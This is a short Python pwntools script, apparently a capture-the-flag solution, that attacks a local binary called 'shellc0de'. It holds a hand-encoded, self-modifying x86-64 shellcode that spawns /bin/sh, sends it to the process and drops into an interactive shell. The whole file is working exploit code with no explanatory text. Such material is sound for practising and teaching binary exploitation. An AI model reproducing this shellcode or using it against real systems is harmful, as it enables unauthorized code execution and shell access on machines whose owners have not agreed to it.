#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context(arch = 'amd64', os = 'linux')
context.log_level = 'debug'

elf  = ELF('./shellc0de')

# Byte sequence alias
A8 = 8 * b'A'


def polymorphic_shellcode():
    return b'\x80\x6a\x1b\x01\x80\x6a\x1c\x01\x80\x6a\x2b\xcc\xeb\x10\x1e\x5f\
\x48\x31\xc0\x04\x3b\x48\x31\xf6\x48\x31\xd2\x10\x06\xc3\x90\xe8\
\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'

def main():
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    raw_input()

    # Develop your exploit here
    proc.recvuntil('shellcode >\n')
    proc.send(polymorphic_shellcode())
    proc.interactive()


if __name__ == '__main__':
    main()
